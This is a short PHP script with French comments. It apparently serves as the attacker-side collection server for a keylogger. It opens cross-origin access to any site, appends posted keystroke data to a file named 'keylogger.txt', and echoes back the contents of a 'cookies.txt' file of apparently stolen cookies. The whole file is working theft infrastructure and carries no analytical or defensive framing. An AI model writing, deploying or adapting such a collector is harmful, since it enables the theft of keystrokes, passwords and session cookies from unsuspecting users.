<?php

    header("Access-Control-Allow-Origin: *");
    header("Access-Control-Allow-Methods: POST, GET, OPTIONS");
    header("Access-Control-Allow-Headers: Content-Type");

    ob_start();

    // Vérifier si une donnée a été envoyée
    if (isset($_POST['key'])) {
        $v = $_POST['key']; // Récupérer la donnée envoyée
    } else {
        $v = ''; // Assurer que la variable est définie
    }

    // Spécifier le fichier de stockage
    $file = 'keylogger.txt';

    // Vérifier si $v contient quelque chose avant d'écrire
    if (!empty($v)) {
        $handle = fopen($file, "a"); // Ouvrir le fichier en mode ajout
        if ($handle) {
            fwrite($handle, $v /*. PHP_EOL*/); // Ajouter une nouvelle ligne après chaque entrée
            fclose($handle);
            echo "Keys saved successfully!";
        } else {
            echo "Error opening file!";
        }
    } else {
        echo "No keys received!";
    }
    

    $fichier = "cookies.txt";
    if (file_exists($fichier)) {
        header("Content-Type: text/plain; charset=UTF-8");
        echo file_get_contents($fichier);
    } else {
        http_response_code(404);
        echo "Erreur : fichier introuvable.";
    }
    ob_end_flush();
?>